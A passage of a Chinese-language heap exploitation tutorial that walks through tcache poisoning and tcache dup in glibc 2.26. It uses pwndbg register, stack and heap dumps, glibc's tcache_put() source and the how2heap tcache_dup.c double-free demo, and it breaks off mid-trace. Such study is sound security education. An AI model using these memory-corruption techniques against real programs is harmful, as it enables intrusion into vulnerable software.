   <span class="err">23</span>   <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c1">;</span>
   <span class="err">24</span> 
   <span class="err">25</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c1">;</span>
 <span class="err">?</span> <span class="err">26</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">27</span> 
   <span class="err">28</span>   <span class="nf">intptr_t</span> <span class="p">*</span><span class="no">b</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">29</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">2</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">b</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">30</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">got</span> <span class="no">the</span> <span class="no">control</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">31</span> 
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span>      <span class="err">0</span><span class="nf">x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">02:0010│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>      <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">—?</span> <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>      <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>      <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span>
</code></pre></div></p>
<p>第二次 malloc，即可 malloc 栈上的地址了
<div class="highlight"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">heapinfo</span>
<span class="err">3886144</span>
<span class="err">(0</span><span class="nf">x20</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x30</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x40</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">2</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x50</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">3</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x60</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">4</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x70</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">5</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x80</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xa0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">8</span><span class="p">]:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">xb0</span><span class="p">)</span>     <span class="no">fastbin</span><span class="p">[</span><span class="mi">9</span><span class="p">]:</span> <span class="mi">0x0</span>
                  <span class="nl">top:</span> <span class="err">0</span><span class="nf">x5555557562e0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x20d20</span><span class="p">)</span> 
       <span class="no">last_remainder</span><span class="p">:</span> <span class="mi">0x0</span> <span class="p">(</span><span class="no">size</span> <span class="p">:</span> <span class="mi">0x0</span><span class="p">)</span> 
            <span class="no">unsortbin</span><span class="p">:</span> <span class="mi">0x0</span>
<span class="err">(0</span><span class="nf">x90</span><span class="p">)</span>   <span class="no">tcache_entry</span><span class="p">[</span><span class="mi">7</span><span class="p">]:</span> <span class="mi">0x7fffffffdfa8</span> <span class="p">--</span><span class="err">&gt;</span> <span class="mi">0x555555554650</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">ni</span>
<span class="err">0</span><span class="nf">x00005555555548c3</span>  <span class="mi">28</span>      <span class="no">intptr_t</span> <span class="p">*</span><span class="no">b</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c1">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x555555756010</span> <span class="err">?—</span> <span class="mi">0xff00000000000000</span>
 <span class="nf">RDX</span>  <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">RDI</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">RSI</span>  <span class="mi">0x555555756048</span> <span class="err">?—</span> <span class="mi">0x0</span>
 <span class="nf">R8</span>   <span class="mi">0x7ffff7fd14c0</span> <span class="err">?—</span> <span class="mi">0x7ffff7fd14c0</span>
 <span class="nf">R9</span>   <span class="mi">0x7fffffffb78c</span> <span class="err">?—</span> <span class="mi">0x2c00000000</span>
 <span class="nf">R10</span>  <span class="mi">0x0</span>
 <span class="nf">R11</span>  <span class="mi">0x246</span>
 <span class="nf">R12</span>  <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
 <span class="nf">R13</span>  <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R14</span>  <span class="mi">0x0</span>
 <span class="nf">R15</span>  <span class="mi">0x0</span>
 <span class="nf">RBP</span>  <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RSP</span>  <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
 <span class="nf">RIP</span>  <span class="mi">0x5555555548c3</span> <span class="p">(</span><span class="no">main</span><span class="err">+</span><span class="mi">361</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">],</span> <span class="no">rax</span>
<span class="err">───────────────────────────────────────[</span> <span class="nf">DISASM</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
   <span class="err">0</span><span class="nf">x5555555548ac</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">338</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555548af</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">341</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
   <span class="err">0</span><span class="nf">x5555555548b4</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">346</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">fprintf@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554610</span><span class="err">&gt;</span>

   <span class="err">0</span><span class="nf">x5555555548b9</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">351</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="mi">0x80</span>
   <span class="err">0</span><span class="nf">x5555555548be</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">356</span><span class="err">&gt;</span>    <span class="no">call</span>   <span class="no">malloc@plt</span> <span class="err">&lt;</span><span class="mi">0x555555554620</span><span class="err">&gt;</span>

 <span class="err">?</span> <span class="err">0</span><span class="nf">x5555555548c3</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">361</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">],</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555548c7</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">365</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x200792</span><span class="p">]</span> <span class="err">&lt;</span><span class="mi">0x555555755060</span><span class="err">&gt;</span>
   <span class="err">0</span><span class="nf">x5555555548ce</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">372</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span> <span class="no">qword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">rbp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555548d2</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">376</span><span class="err">&gt;</span>    <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x2b4</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x5555555548d9</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">383</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
   <span class="err">0</span><span class="nf">x5555555548dc</span> <span class="err">&lt;</span><span class="no">main</span><span class="err">+</span><span class="mi">386</span><span class="err">&gt;</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span>
<span class="err">────────────────────────────────────[</span> <span class="nf">SOURCE</span> <span class="p">(</span><span class="no">CODE</span><span class="p">)</span> <span class="p">]</span><span class="err">────────────────────────────────────</span>
   <span class="err">23</span>   <span class="nf">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="err">=</span> <span class="p">(</span><span class="no">intptr_t</span><span class="p">)</span><span class="err">&amp;</span><span class="no">stack_var</span><span class="c1">;</span>
   <span class="err">24</span> 
   <span class="err">25</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">1</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">))</span><span class="c1">;</span>
   <span class="err">26</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">Now</span> <span class="no">the</span> <span class="no">tcache</span> <span class="no">list</span> <span class="no">has</span> <span class="p">[</span> <span class="nv">%p</span> <span class="p">].</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="err">&amp;</span><span class="no">stack_var</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">27</span> 
 <span class="err">?</span> <span class="err">28</span>   <span class="nf">intptr_t</span> <span class="p">*</span><span class="no">b</span> <span class="err">=</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">29</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="mi">2</span><span class="no">st</span> <span class="no">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">):</span> <span class="nv">%p</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="no">b</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">30</span>   <span class="nf">fprintf</span><span class="p">(</span><span class="no">stderr</span><span class="p">,</span> <span class="err">&quot;</span><span class="no">We</span> <span class="no">got</span> <span class="no">the</span> <span class="no">control</span><span class="err">\</span><span class="no">n</span><span class="err">&quot;</span><span class="p">)</span><span class="c1">;</span>
   <span class="err">31</span> 
   <span class="err">32</span>   <span class="nf">return</span> <span class="mi">0</span><span class="c1">;</span>
   <span class="err">33</span> <span class="err">}</span>
<span class="err">────────────────────────────────────────[</span> <span class="nf">STACK</span> <span class="p">]</span><span class="err">────────────────────────────────────────</span>
<span class="err">00:0000│</span> <span class="nf">rsp</span>      <span class="mi">0x7fffffffdfa0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">01:0008│</span> <span class="nf">rax</span> <span class="no">rdx</span>  <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">02:0010│</span>          <span class="err">0</span><span class="nf">x7fffffffdfb0</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a0</span> <span class="err">?—</span> <span class="mi">0x1</span>
<span class="err">03:0018│</span>          <span class="err">0</span><span class="nf">x7fffffffdfb8</span> <span class="err">—?</span> <span class="mi">0x555555756260</span> <span class="err">—?</span> <span class="mi">0x7fffffffdfa8</span> <span class="err">—?</span> <span class="mi">0x555555554650</span> <span class="p">(</span><span class="no">_start</span><span class="p">)</span> <span class="err">?—</span> <span class="no">xor</span>    <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
<span class="err">04:0020│</span> <span class="nf">rbp</span>      <span class="mi">0x7fffffffdfc0</span> <span class="err">—?</span> <span class="mi">0x555555554910</span> <span class="p">(</span><span class="no">__libc_csu_init</span><span class="p">)</span> <span class="err">?—</span> <span class="no">push</span>   <span class="no">r15</span>
<span class="err">05:0028│</span>          <span class="err">0</span><span class="nf">x7fffffffdfc8</span> <span class="err">—?</span> <span class="mi">0x7ffff7a3fa87</span> <span class="p">(</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">231</span><span class="p">)</span> <span class="err">?—</span> <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>
<span class="err">06:0030│</span>          <span class="err">0</span><span class="nf">x7fffffffdfd0</span> <span class="err">?—</span> <span class="mi">0x0</span>
<span class="err">07:0038│</span>          <span class="err">0</span><span class="nf">x7fffffffdfd8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe0a8</span> <span class="err">—?</span> <span class="mi">0x7fffffffe3c6</span> <span class="err">?—</span> <span class="mi">0x346d2f656d6f682f</span> <span class="p">(</span><span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">m4</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">i</span> <span class="no">r</span> <span class="no">rax</span>
<span class="nf">rax</span>            <span class="mi">0x7fffffffdfa8</span>   <span class="mi">140737488347048</span>
</code></pre></div>
可以看出 <code>tcache posioning</code> 这种方法和 fastbin attack 类似，但因为没有 size 的限制有了更大的利用范围。</p>
<h4 id="tcache-dup">tcache dup<a class="headerlink" href="#tcache-dup" title="Permanent link">&para;</a></h4>
<p>类似 <code>fastbin dup</code>，不过利用的是 <code>tcache_put()</code> 的不严谨
<div class="highlight"><pre><span></span><code><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
<span class="n">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div>
可以看出，<code>tcache_put()</code> 的检查也可以忽略不计（甚至没有对 <code>tcache-&gt;counts[tc_idx]</code> 的检查），大幅提高性能的同时安全性也下降了很多。</p>
<p>因为没有任何检查，所以我们可以对同一个 chunk 多次 free，造成 cycliced list。</p>
<p>以 how2heap 的 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c">tcache_dup</a> 为例分析，源码如下：
<div class="highlight"><pre><span></span><code><span class="n">glibc_2</span><span class="mf">.26</span> <span class="p">[</span><span class="n">master</span><span class="err">●</span><span class="p">]</span> <span class="n">bat</span> <span class="p">.</span><span class="o">/</span><span class="n">tcache_dup</span><span class="p">.</span><span class="n">c</span> 
<span class="err">───────┬─────────────────────────────────────────────────────────────────────────────────</span>
       <span class="err">│</span> <span class="nl">File</span><span class="p">:</span> <span class="p">.</span><span class="o">/</span><span class="n">tcache_dup</span><span class="p">.</span><span class="n">c</span>
<span class="err">───────┼─────────────────────────────────────────────────────────────────────────────────</span>
   <span class="mi">1</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
   <span class="mi">2</span>   <span class="err">│</span> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
   <span class="mi">3</span>   <span class="err">│</span> 
   <span class="mi">4</span>   <span class="err">│</span> <span class="kt">int</span> <span class="n">main</span><span class="p">()</span>
   <span class="mi">5</span>   <span class="err">│</span> <span class="p">{</span>
   <span class="mi">6</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates a simple double-free attack with</span>
       <span class="err">│</span>  <span class="n">tcache</span><span class="p">.</span><span class="err">\</span><span class="n">n</span><span class="s">&quot;);</span>
   <span class="mi">7</span>   <span class="err">│</span> 
   <span class="mi">8</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Allocating buffer.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
   <span class="mi">9</span>   <span class="err">│</span>         <span class="kt">int</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
  <span class="mi">10</span>   <span class="err">│</span> 
  <span class="mi">11</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc(8): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
  <span class="mi">12</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Freeing twice...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
  <span class="mi">13</span>   <span class="err">│</span>         <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
  <span class="mi">14</span>   <span class="err">│</span>         <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
  <span class="mi">15</span>   <span class="err">│</span> 
  <span class="mi">16</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the free list has [ %p, %p ].</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
  <span class="mi">17</span>   <span class="err">│</span>         <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Next allocated buffers will be same: [ %p, %p ].</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ma</span>
       <span class="err">│</span> <span class="n">lloc</span><span class="p">(</span><span class="mi">8</span><span class="p">),</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">));</span>
  <span class="mi">18</span>   <span class="err">│</span> 
  <span class="mi">19</span>   <span class="err">│</span>         <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="mi">20</span>   <span class="err">│</span> <span class="p">}</span>
<span class="err">───────┴─────────────────────────────────────────────────────────────────────────────────</span>
</code></pre></div></p>
<p>调试一下，第一次 free
<div class="highlight"><pre><span></span><code><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">n</span>
<span class="err">14</span>      <span class="nf">free</span><span class="p">(</span><span class="no">a</span><span class="p">)</span><span class="c1">;</span>
<span class="nl">LEGEND:</span> <span class="nf">STACK</span> <span class="err">|</span> <span class="no">HEAP</span> <span class="err">|</span> <span class="no">CODE</span> <span class="err">|</span> <span class="no">DATA</span> <span class="err">|</span> <span class="no">RWX</span> <span class="err">|</span> <span class="no">RODATA</span>
<span class="err">──────────────────────────────────────[</span> <span class="nf">REGISTERS</span> <span class="p">]</span><span class="err">──────────────────────────────────────</span>
 <span class="nf">RAX</span>  <span class="mi">0x0</span>
 <span class="nf">RBX</span>  <span class="mi">0x0</span>
 <span class="nf">RCX</span>  <span class="mi">0x0</span>
 <span class="nf">RDX</span>  <span class="mi">0x0</span>
 <span class="nf">RDI</span>  <span class="mi">0x1</span>
 <span class="nf">RSI</span>  <span class="mi">0x555555756010</span> <span class="err">?—</span> <span class="mi">0x1</span>
 <span class="nf">R8</span>   <span class="mi">0x0</span>
